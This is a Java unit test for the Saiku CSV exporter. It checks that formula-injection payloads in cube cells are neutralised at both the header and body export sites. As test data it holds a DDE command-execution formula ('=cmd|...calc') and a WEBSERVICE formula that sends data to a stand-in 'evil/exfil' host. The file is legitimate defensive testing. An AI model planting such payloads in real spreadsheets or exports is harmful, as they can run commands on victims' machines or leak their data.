/*
 *   Copyright 2026 Spicule Ltd
 *   Apache License, Version 2.0.
 */
package org.saiku.service.util.export;

import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertTrue;

import java.nio.charset.StandardCharsets;
import org.junit.Test;
import org.saiku.olap.dto.resultset.AbstractBaseCell;
import org.saiku.olap.dto.resultset.CellDataSet;
import org.saiku.olap.dto.resultset.DataCell;

/**
 * CSV formula-injection (CWE-1236) <b>wiring</b> coverage — complements {@link CsvExporterTest},
 * which exercises {@link CsvExporter#neutralizeCsvFormula} directly. This drives the
 * {@link CsvExporter#getCsv(CellDataSet, String, String)} export path with a malicious cube cell
 * to prove the neutralisation is actually APPLIED at the header + body emission sites. The unit
 * test locks the helper; this locks the call-site — so a refactor that dropped the
 * {@code neutralizeCsvFormula(...)} wrapping at an emission point (the real regression risk) goes
 * RED, not only one that broke the helper itself.
 */
public class CsvExporterWiringTest {

    private static DataCell cell(String formattedValue) {
        DataCell c = new DataCell();
        c.setFormattedValue(formattedValue);
        return c;
    }

    /** One-cell header + one-cell body, exported via the package-private CellDataSet seam. */
    private static String export(String headerValue, String bodyValue) {
        CellDataSet cds = new CellDataSet();
        cds.setCellSetHeaders(new AbstractBaseCell[][] {{cell(headerValue)}});
        cds.setCellSetBody(new AbstractBaseCell[][] {{cell(bodyValue)}});
        return new String(CsvExporter.getCsv(cds, ",", ""), StandardCharsets.UTF_8);
    }

    @Test
    public void exportNeutralisesAMaliciousHeader() {
        // Header emission site (getCsv(CellDataSet,…), the rowHeader loop).
        String csv = export("=cmd|'/C calc'!A0", "Beer");
        assertTrue("malicious header must be neutralised in the export: " + csv, csv.contains("'=cmd|'/C calc'!A0"));
    }

    @Test
    public void exportNeutralisesAMaliciousBodyValue() {
        // Body emission site (getCsv(CellDataSet,…), the rowData loop).
        String csv = export("Product", "=WEBSERVICE(\"http://evil/exfil\")");
        assertTrue("malicious body value must be neutralised in the export: " + csv, csv.contains("'=WEBSERVICE"));
    }

    @Test
    public void exportLeavesBenignTextAndNumbersUnquoted() {
        // Negative control: the wiring must not over-neutralise legitimate data.
        String text = export("Product", "Beer");
        assertFalse("benign text must not gain a formula-guard prefix: " + text, text.contains("'Beer"));
        String number = export("Margin", "-1,234.50");
        assertFalse("a negative number must not be quoted into text: " + number, number.contains("'-1,234.50"));
    }
}
